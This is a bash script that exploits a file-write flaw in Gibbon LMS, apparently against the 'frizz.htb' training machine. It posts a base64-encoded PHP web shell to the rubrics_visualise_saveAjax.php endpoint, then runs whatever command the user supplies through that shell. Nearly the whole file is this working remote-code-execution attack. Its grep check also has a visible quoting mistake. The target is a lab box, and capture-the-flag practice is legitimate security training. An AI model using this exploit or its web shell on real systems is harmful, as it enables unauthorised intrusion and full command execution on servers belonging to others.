#!/usr/bin/env bash

if [[ -z "${@:1}" ]] ; then 

    echo "Usage: $0 REMOTE_COMMAND"

elif ! which jq >/dev/null ; then

    echo "Package 'jq' required for URL encoding payloads. Please install."

else

    COMMAND="${@:1}"
    URL_ENCODED_COMMAND=$(echo -n "$COMMAND" | jq -SRr @uri)
    RCE='http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php'
    VULNERABLE_URL='http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php'
    PAYLOAD='img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=asdf.php&gibbonPersonID=0000000001'

    # Ensure the file has not been wiped
    if ! curl -sI "$RCE" | grep 'HTTP/1.1 200 OK > /dev/null'; then
        curl -si "$VULNERABLE_URL" -d "$PAYLOAD" >/dev/null
    fi

    curl -s "$RCE?cmd=${URL_ENCODED_COMMAND}"

fi
